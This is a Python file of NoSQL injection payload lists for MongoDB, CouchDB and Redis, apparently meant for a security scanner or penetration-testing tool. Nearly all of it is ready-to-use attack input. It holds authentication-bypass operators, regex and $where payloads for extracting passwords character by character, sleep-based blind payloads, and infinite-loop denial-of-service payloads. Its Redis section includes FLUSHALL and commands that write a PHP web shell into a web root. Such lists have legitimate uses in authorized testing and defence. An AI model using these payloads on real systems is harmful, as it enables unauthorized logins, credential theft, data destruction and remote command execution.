"""
NoSQL Injection Payloads
Covers MongoDB, CouchDB, Redis, and others
"""

NOSQL_PAYLOADS = {
    "detection": [
        # Basic detection
        "' || '1'=='1",
        "'; return true; var x='",
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        "true, $where: '1 == 1'",
        ", $where: '1 == 1'",
        "$where: '1 == 1'",
        "', $where: '1 == 1'",
        '1, $where: "1 == 1"',
        '{ $where: "1 == 1" }',
        "1; return true",
    ],

    "authentication_bypass": [
        # MongoDB auth bypass
        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
        '{"username": "admin", "password": {"$ne": ""}}',
        '{"username": "admin", "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$regex": ".*"}}',
        '{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}',
        '{"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$ne": ""}}',

        # URL encoded
        'username[$ne]=&password[$ne]=',
        'username[$gt]=&password[$gt]=',
        'username=admin&password[$ne]=',
        'username=admin&password[$regex]=.*',
        'username[$regex]=.*&password[$regex]=.*',
        'username[$in][0]=admin&password[$ne]=',
    ],

    "data_extraction": [
        # Extract data with $regex
        '{"username": {"$regex": "^a"}}',
        '{"username": {"$regex": "^ad"}}',
        '{"username": {"$regex": "^adm"}}',
        '{"password": {"$regex": "^."}}',

        # Extract with $where
        '{"$where": "this.username.length > 0"}',
        '{"$where": "this.password.length == 5"}',
        '{"$where": "this.password.charAt(0) == \'a\'"}',

        # Substring extraction
        '{"$where": "this.password.substring(0,1) == \'a\'"}',
        '{"$where": "this.password.match(/^a.*/)"}',
    ],

    "mongodb_specific": [
        # $where clause injection
        '{"$where": "function() { return true; }"}',
        '{"$where": "sleep(5000)"}',
        '{"$where": "this.a > 0; sleep(5000); true"}',

        # Aggregation pipeline
        '[{"$match": {"$expr": {"$gt": [1, 0]}}}]',
        '[{"$lookup": {"from": "users", "pipeline": [], "as": "data"}}]',

        # Server-side JS
        '{"$where": "db.version()"}',
        '{"$where": "db.serverStatus()"}',
    ],

    "time_based": [
        # Time-based blind
        '{"$where": "sleep(5000)"}',
        '{"$where": "function() { sleep(5000); return true; }"}',
        '{"$where": "this.password.match(/^a/) && sleep(5000)"}',
        "1' && this.password.match(/^a/) && sleep(5000) && 'a'=='a",
    ],

    "couchdb": [
        # CouchDB specific
        '{"selector": {"_id": {"$gt": null}}}',
        '{"selector": {"password": {"$regex": ".*"}}}',
        '/_all_dbs',
        '/_users/_all_docs',
        '/_config/admins',
    ],

    "redis": [
        # Redis injection
        'FLUSHALL',
        'CONFIG GET *',
        'CONFIG SET dir /var/www/html',
        'CONFIG SET dbfilename shell.php',
        'SET shell "<?php system($_GET[\'cmd\']); ?>"',
        'SAVE',
        'KEYS *',
        'GET session:admin',
        'EVAL "return redis.call(\'keys\',\'*\')" 0',
    ],

    "operator_injection": [
        # Inject operators
        '{"$gt": ""}',
        '{"$gte": ""}',
        '{"$lt": "~"}',
        '{"$lte": "~"}',
        '{"$ne": null}',
        '{"$nin": []}',
        '{"$in": ["admin", "root"]}',
        '{"$exists": true}',
        '{"$type": 2}',  # String type
        '{"$or": [{}, {"a": 1}]}',
        '{"$and": [{}, {"a": 1}]}',
    ],
}

# MongoDB specific attacks
MONGODB_ATTACKS = {
    "rce": [
        # Server-side JavaScript (if enabled)
        '{"$where": "function() { var x = new Mongo().getDB(\'admin\'); return true; }"}',
        '{"$where": "function() { return db.adminCommand(\'listDatabases\'); }"}',
    ],

    "ssrf": [
        # Connect to internal services
        '{"$where": "function() { var x = new Mongo(\'internal-service:27017\'); return true; }"}',
    ],

    "dos": [
        # Resource exhaustion
        '{"$where": "function() { while(1) {} }"}',
        '{"$where": "function() { var x = []; while(1) { x.push(1); } }"}',
    ],
}

# URL parameter format
NOSQL_URL_PARAMS = {
    "operators": [
        'param[$ne]=value',
        'param[$gt]=',
        'param[$gte]=',
        'param[$lt]=~',
        'param[$lte]=~',
        'param[$regex]=.*',
        'param[$exists]=true',
        'param[$in][0]=value1&param[$in][1]=value2',
        'param[$nin][0]=value',
        'param[$or][0][a]=1',
        'param[$where]=true',
    ],

    "bypass": [
        # Different encodings
        'param%5B%24ne%5D=',  # URL encoded
        'param%5b%24ne%5d=',  # lowercase
        'param[%24ne]=',
        'param[$N%45]=',  # mixed case
    ],
}

# JSON injection variants
NOSQL_JSON_INJECTION = {
    "basic": [
        '", "$or": [{}], "a": "',
        '", "$where": "1==1", "a": "',
        '\", \"$gt\": \"',
        '{"$gt": ""}',
    ],

    "nested": [
        '{"a": {"$gt": ""}}',
        '{"$or": [{"a": {"$gt": ""}}, {"b": 1}]}',
        '{"$and": [{"a": {"$ne": ""}}, {"b": {"$ne": ""}}]}',
    ],
}
